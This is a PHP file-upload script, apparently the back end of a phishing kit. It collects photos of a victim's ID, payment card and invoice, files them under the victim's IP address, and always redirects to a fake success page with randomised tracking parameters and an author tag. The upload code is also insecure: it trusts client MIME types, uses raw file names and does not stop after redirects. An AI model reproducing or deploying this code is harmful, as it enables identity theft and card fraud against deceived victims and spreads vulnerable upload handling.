<?php

if( isset($_POST['btn_file']) ) // si formulaire soumis
{   $ip = $_SERVER['REMOTE_ADDR'];
    $content_dir = 'rst/files/'.$ip; // dossier où sera déplacé le fichier

    $tmp_file = $_FILES['id']['tmp_name'];
    $tmp_file2 = $_FILES['card']['tmp_name'];
    $tmp_file3 = $_FILES['invoice']['tmp_name'];
    if( !is_uploaded_file($tmp_file) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on vérifie maintenant l'extension
    $type_file = $_FILES['id']['type'];

    if( !strstr($type_file, 'jpg') && !strstr($type_file, 'jpeg') && !strstr($type_file, 'bmp') && !strstr($type_file, 'gif') && !strstr($type_file, 'png') )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on copie le fichier dans le dossier de destination
    $name_file = $_FILES['id']['name'];

    if( !move_uploaded_file($tmp_file, $content_dir . $name_file) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }
/*
 * Send File 2
 */

    if( !is_uploaded_file($tmp_file2) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on vérifie maintenant l'extension
    $type_file2 = $_FILES['card']['type'];

    if( !strstr($type_file2, 'jpg') && !strstr($type_file2, 'jpeg') && !strstr($type_file2, 'bmp') && !strstr($type_file2, 'gif') && !strstr($type_file2, 'png') )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on copie le fichier dans le dossier de destination
    $name_file = $_FILES['card']['name'];

    if( !move_uploaded_file($tmp_file2, $content_dir . $name_file) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }
/*
 * Send File 3
 */

    if( !is_uploaded_file($tmp_file3) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on vérifie maintenant l'extension
    $type_file2 = $_FILES['invoice']['type'];

    if( !strstr($type_file2, 'jpg') && !strstr($type_file2, 'jpeg') && !strstr($type_file2, 'bmp') && !strstr($type_file2, 'gif') && !strstr($type_file2, 'png') )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }

    // on copie le fichier dans le dossier de destination
    $name_file = $_FILES['invoice']['name'];

    if( !move_uploaded_file($tmp_file3, $content_dir . $name_file) )
    {
        header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
    }









    header("location:success.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}

?>